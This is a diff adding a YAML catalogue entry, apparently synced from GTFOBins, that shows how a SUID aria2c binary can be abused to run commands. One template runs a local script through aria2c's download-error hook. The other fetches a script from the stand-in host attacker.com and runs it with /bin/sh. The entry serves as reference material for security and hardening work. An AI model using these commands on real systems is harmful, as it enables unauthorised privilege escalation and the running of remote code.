@@ -1,0 +1,33 @@
+id: gtfobins/aria2c/command/suid
+type: binary
+platform: linux
+name: aria2c
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo /path/to/command >/path/to/temp-file
+
+    chmod +x /path/to/temp-file
+
+    aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain'
+  comment: Note that the subprocess is immediately sent to the background.
+- template: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
+  comment: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script,
+    e.g., `/path/to/command`. Note that said file needs to be written on disk in order to be executed.
+    `--allow-overwrite` is needed if this is executed multiple times with the same GID.
+references:
+- https://gtfobins.github.io/gtfobins/aria2c/
+tags:
+- linux
+- unix
+- gtfobins
